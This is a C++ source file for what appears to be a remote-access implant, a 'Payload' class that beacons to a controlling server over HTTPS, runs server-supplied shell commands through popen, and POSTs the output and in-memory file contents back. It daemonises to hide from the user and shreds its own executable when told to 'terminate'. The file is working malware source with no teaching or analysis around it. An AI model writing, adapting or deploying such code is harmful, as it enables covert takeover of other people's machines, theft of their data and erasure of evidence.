#include "../headers/payload.h"
#include "../headers/https.h"
#include "../headers/debug.h"
#include "../headers/info.h"
#include <cstdio>
#include <unistd.h>
#include <fcntl.h>
#include <vector>
#include <string>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sstream>
#include <thread>

#ifdef DEBUG
#include <iostream>
#define DBG(x) std::cout << x << std::endl;
#endif

int Payload::heartbeat(Https &https, int i, int j)
{
	//int result = https.httpsInit(IP);
	//if(result < 0) return -1;

	int result = https.craftPost(i, j);
	if (result < 0)
		return -1;

	auto response = https.recvData();
	//if (response.empty()) return 0;

	return 0;
}

int Payload::hide()
{
	if (daemon(0, 0) < 0) {
		pid_t pid = fork();

		if (pid < 0)
			return -1;
		if (pid > 0)
			exit(0);

		if (setsid() < 0)
			return -1;

		pid = fork();
		if (pid < 0)
			return -1;
		if (pid > 0)
			exit(0);

		chdir("/");
		int fd = open("/dev/null", O_RDWR);
		if (fd < 0)
			return -1;
		dup2(fd, STDIN_FILENO);
		dup2(fd, STDOUT_FILENO);
		dup2(fd, STDERR_FILENO);

		if (fd > STDERR_FILENO)
			close(fd);
	}

	return 0;
}

void Payload::hibernate()
{
	std::this_thread::sleep_for(std::chrono::hours(12));
	return;
}

int Payload::suicide()
{
	char path[MAX_PATH];
	ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);

	if (len < 0)
		return -1;
	path[len] = '\0';

	if (execl("/bin/shred", "shred", "-z", "-u", path, (char *)NULL) == -1)
		unlink(path);
	return 0;
}

std::vector<std::string> Payload::recvCMD(Https &https, int i, int j)
{
	int result = -1;
	result = https.craftGet(i, j);
	if (result < 0)
		return {};

	auto response = https.recvData();

	return response;
}

int Payload::spawnChild(std::vector<std::string> &commands,
			std::vector<std::string> &results, int *suicide)
{
	// ==========
	//   DIE???
	// ==========
	if (!suicide)
		return -1;
	*suicide = 0;
	for (const auto &cmd : commands) {
		if (cmd == "terminate") {
			*suicide = 1;
			break;
		}
	}

	int pipefd[2];
	if (pipe(pipefd) < 0)
		return -1;

	pid_t pid = fork();

	if (pid < 0)
		return -1;

	if (pid == 0) {
		// Child
		close(pipefd[0]);

		std::vector<std::string> childResults;

		runCMD(commands, childResults);

		for (const auto &line : childResults) {
			write(pipefd[1], line.c_str(), line.size());
			write(pipefd[1], "\n", 1);
		}

		close(pipefd[1]);
		_exit(0);
	}

	// Parent
	close(pipefd[1]);

	char buffer[1024];
	std::string output;

	ssize_t bytes;
	while ((bytes = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
		output.append(buffer, bytes);
	}

	close(pipefd[0]);

	waitpid(pid, nullptr, 0);

	std::stringstream ss(output);
	std::string line;

	while (std::getline(ss, line)) {
		if (!line.empty()) {
			results.push_back(line);
		}
	}
	return 0;
}

int Payload::runCMD(std::vector<std::string> &commands,
		    std::vector<std::string> &results)
{
	char buffer[1024]; // temporary buffer for fgets

	for (auto &cmd : commands) {
		if (cmd == "terminate")
			continue;

		FILE *fp = popen(cmd.c_str(), "r");
		if (!fp) {
			results.push_back("N/A");
			continue;
		}

		std::string info;
		while (fgets(buffer, sizeof(buffer), fp)) {
			info += buffer; // append the line to the string
		}

		results.push_back(info); // add the full output to results

		pclose(fp);
	}
	return 0;
}

int Payload::sendMemPayload(Https &https, int fd,
			    const std::string &jsonPayload)
{
	if (fd < 0 || jsonPayload.empty())
		return -1;

	if (lseek(fd, 0, SEEK_SET) < 0)
		return -1;

	// Read content of memfd into a string
	std::string payload;
	char buffer[2048];
	ssize_t bytesRead;
	while ((bytesRead = read(fd, buffer, sizeof(buffer))) > 0) {
		payload.append(buffer, bytesRead);
	}

	if (bytesRead < 0)
		return -1;

	//if (!https.isConnected()) return -1;

	// Send the payload via POST
	if (https.craftPost(2, 0, payload) == 0) {
		close(fd);
		return 0;
	}

	return -1;
}
